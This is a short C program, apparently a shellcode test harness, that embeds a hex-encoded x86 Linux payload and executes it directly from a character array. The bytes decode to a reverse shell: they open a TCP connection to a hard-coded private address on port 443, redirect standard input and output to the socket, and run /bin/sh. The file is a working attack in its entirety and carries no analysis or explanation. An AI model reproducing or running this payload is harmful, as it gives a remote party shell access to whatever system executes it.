#include "stdio.h"
 
int main(int argc, char *argv[])
{
 
char shellcode[]
="\x6a\x66\x58\x31\xdb\x31\xc9\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x6a\x66\x58\x6a\x03\x5b\x68\xc0\xa8\xf2\x8a\x68\x02\x00\x01\xbb\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x3c\x00\x75\x2d\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\xeb\x0d\x5b\x80\x73\x07\x41\x56\x53\x89\xe1\x89\xf2\xcd\x80\xe8\xee\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x31\xc0\xb0\x01\xcd\x80";
 
printf("Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
 
return 0;
}

